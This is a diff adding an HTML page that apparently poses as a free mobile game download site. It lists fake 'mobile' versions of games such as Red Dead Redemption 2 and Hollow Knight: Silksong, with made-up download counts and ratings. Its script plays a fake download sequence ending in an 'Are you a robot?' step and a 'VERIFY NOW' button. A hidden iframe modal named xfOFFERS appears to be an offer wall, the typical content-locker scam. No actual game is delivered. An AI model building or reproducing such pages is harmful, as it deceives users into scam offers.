+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">654K</p>
+      <div class="rating" title="3 stars">⭐️⭐️⭐️⭐️☆</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;Pokémon Legends:ZA&#39;,&#39;Pokemon Legends ZA APK is an immersive Pokémon adventure featuring an open world, dynamic battles, rare Pokémon, and a rich storyline in the ZA region.&#39;,&#39;https://e.snmc.io/lk/lv/x/2f04594b71cd32f5eacbc8f4d9a009a3/13758993?auth=c1d17136b5d646647c613756604400ebdda9ca03269caf80615f5af462e28c89&amp;width=1200&amp;height=1200&amp;smart=true&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;EFOOTBALL 25 Mod&#39;,&#39;Pokemon Legends ZA APK is an immersive Pokémon adventure featuring an open world, dynamic battles, rare Pokémon, and a rich storyline in the ZA region.&#39;,&#39;https://e.snmc.io/lk/lv/x/2f04594b71cd32f5eacbc8f4d9a009a3/13758993?auth=c1d17136b5d646647c613756604400ebdda9ca03269caf80615f5af462e28c89&amp;width=1200&amp;height=1200&amp;smart=true&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 4 -->
+<div class="game-card">
+  <div class="badge">HOT</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/images(2)" alt="Red Dead Redemption 2 Mobile">
+    <div class="game-text">
+      <h3>Red Dead Redemption 2 Mobile</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">2M</p>
+      <div class="rating" title="5 stars">⭐️⭐️⭐️⭐️⭐️</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;Red Dead Redemption 2 Mobile&#39;,&#39;Experience the epic Wild West adventure on your mobile! Explore vast landscapes, complete thrilling missions, and live the Red Dead Redemption 2 story anywhere, anytime&#39;,&#39;https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTqoTocTu5UCHexsiRDy7rKFuVsCtZ2lm-bgA&amp;s&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;Red Dead Redemption 2 Mobile&#39;,&#39;Experience the epic Wild West adventure on your mobile! Explore vast landscapes, complete thrilling missions, and live the Red Dead Redemption 2 story anywhere, anytime&#39;,&#39;https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTqoTocTu5UCHexsiRDy7rKFuVsCtZ2lm-bgA&amp;s&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 5 -->
+<div class="game-card">
+  <div class="badge">NEW</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/1cf3189182c0590efb17a040fd06ce26.jpg" alt="Inside Mobile">
+    <div class="game-text">
+      <h3>Inside Mobile</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">985K</p>
+      <div class="rating" title="4 stars">⭐️⭐️⭐️⭐️☆</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;Inside Mobile&#39;,&#39;Immerse yourself in a dark and atmospheric puzzle-platformer with stunning visuals and emotional storytelling.&#39;,&#39;https://i.pinimg.com/originals/1c/f3/18/1cf3189182c0590efb17a040fd06ce26.jpg&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;Inside Mobile&#39;,&#39;Immerse yourself in a dark and atmospheric puzzle-platformer with stunning visuals and emotional storytelling.&#39;,&#39;https://i.pinimg.com/originals/1c/f3/18/1cf3189182c0590efb17a040fd06ce26.jpg&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 6 -->
+<div class="game-card">
+  <div class="badge">TOP</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/a17ee42b0c520fbc992df2f7a4465cf2.jpg" alt="Riders republic mobile">
+    <div class="game-text">
+      <h3>Riders republic mobile</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">456K</p>
+      <div class="rating" title="5 stars">⭐️⭐️⭐️⭐️⭐️</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;Riders republic mobile&#39;,&#39;Jump into an open-world extreme sports playground with Riders Republic Mobile. Ski, snowboard, bike, and wingsuit across massive landscapes, compete with players worldwide, and create your own legacy of adrenaline.&#39;,&#39;https://s3.amazonaws.com/gameopedia_covers/covers/1344069/a17ee42b0c520fbc992df2f7a4465cf2.jpg&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;Riders republic mobile&#39;,&#39;Jump into an open-world extreme sports playground with Riders Republic Mobile. Ski, snowboard, bike, and wingsuit across massive landscapes, compete with players worldwide, and create your own legacy of adrenaline.&#39;,&#39;https://s3.amazonaws.com/gameopedia_covers/covers/1344069/a17ee42b0c520fbc992df2f7a4465cf2.jpg&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Game 7 -->
+<div class="game-card">
+  <div class="badge">HOT</div>
+  <div class="game-info">
+    <img src="./Top Mobile Games_files/hollow-knight-silksong-art-a.jpg" alt="Hollow Knight: Silksong">
+    <div class="game-text">
+      <h3>Hollow Knight: Silksong</h3>
+      <p class="downloads"><img src="./Top Mobile Games_files/download.png">879K</p>
+      <div class="rating" title="4 stars">⭐️⭐️⭐️⭐️☆</div>
+    </div>
+  </div>
+  <div class="download-section">
+    <div class="choose-device">🎮 Choose your device</div>
+    <div class="download-btns">
+      <button class="download-btn" onclick="openModal(&#39;Hollow Knight: Silksong&#39;,&#39;Discover a vast, haunted kingdom in Hollow Knight: Silksong! Explore, fight and survive...&#39;,&#39;https://assetsio.gnwcdn.com/hollow-knight-silksong-art-a.jpg?width=1200&amp;height=1200&amp;fit=crop&amp;quality=100&amp;format=png&amp;enable=upscale&amp;auto=webp&#39;)">
+        <img src="./Top Mobile Games_files/android-os.png"> Android
+      </button>
+      <button class="download-btn" onclick="openModal(&#39;Hollow Knight: Silksong&#39;,&#39;Discover a vast, haunted kingdom in Hollow Knight: Silksong! Explore, fight and survive...&#39;,&#39;https://assetsio.gnwcdn.com/hollow-knight-silksong-art-a.jpg?width=1200&amp;height=1200&amp;fit=crop&amp;quality=100&amp;format=png&amp;enable=upscale&amp;auto=webp&#39;)">
+        <img src="./Top Mobile Games_files/mac-os.png"> iOS
+      </button>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- Modal -->
+<div class="download-modal" id="gameModal" style="display: block;">
+  <h4 id="modalTitle">GTA Vice City</h4>
+  <img id="modalImg" src="./Top Mobile Games_files/EsGaEjHVjly_beK_ZCBl8Uoz6NRbm7fZm4qI-OdcFZU.jpg" alt="Game Image">
+  <p id="modalDesc">GTA Vice City is an action-packed open-world game set in a vibrant 1980s city, where you complete missions, drive cars, and experience thrilling gangster adventures.</p>
+  <p id="modalInfo">Download ready<br>Click the button below in order to start with your app download.</p>
+  <button id="modalDownloadBtn" onclick="startDownloadModal()">INSTALL</button>
+</div>
+
+<!-- Loader Modal -->
+<div class="modal" id="loaderModal" style="display: flex;">
+  <div class="modal-content">
+    <h2 id="loaderText">Start Downloading...</h2>
+    <div class="loader" style="display: block;"></div>
+    <div id="lockerText" style="display:none; margin-top:20px;">
+  <button id="verifyBtn" onclick="_cy()">VERIFY NOW</button>
+</div>
+  </div>
+</div>
+
+<footer>
+  © All trademarks, service marks, trade names, trade dress, product names and logos appearing on the site are the property of their respective owners.
+</footer>
+
+<script>
+function openModal(title,desc,img){
+  const modal = document.getElementById('gameModal');
+  document.getElementById('modalTitle').innerText = title;
+  document.getElementById('modalDesc').innerText = desc;
+  document.getElementById('modalImg').src = img;
+  modal.style.display='block';
+}
+
+function startDownloadModal(){
+  document.getElementById('loaderModal').style.display='flex';
+  document.getElementById('lockerText').style.display='none';
+  document.querySelector('#loaderModal .loader').style.display='block';
+
+  let steps = ["Start Downloading...", "Processing...", "Are you a robot?"];
+  let i = 0;
+
+  function nextStep(){
+    if(i < steps.length){
+      document.getElementById('loaderText').innerText = steps[i];
+      i++;
+      setTimeout(nextStep, 2000);
+    } else {
+      document.querySelector('#loaderModal .loader').style.display='none';
+      document.getElementById('loaderText').innerText = '';
+      document.getElementById('lockerText').style.display='block';
+    }
+  }
+  nextStep();
+}
+
+function openLocker(){
+  alert("Redirecting to verification page...");
+}
+
+window.onclick=function(event){
+  const modal=document.getElementById('gameModal');
+  if(event.target === modal) modal.style.display='none';
+}
+</script>
+
+
+<div id="xf_MODAL_CONTAINER" style="display: none;"><div id="xf_MODAL">
+    <div id="xfMODALCONTENT" class="xf_fadeIn">
+        <div id="xfMODALHEADER">
+            <div id="xfMODALTITLE"></div> </div>
+        <div id="xfMODALBODY">
+            <iframe id="xfOFFERS" style="overflow:hidden;" src="./Top Mobile Games_files/saved_resource.html"></iframe>
+        </div>
+        <div id="xfMODALFOOTER">
+            <p id="xfMODALFOOTERTEXT"></p>
+        </div>
+    </div>
+</div>
+</div></body></html>
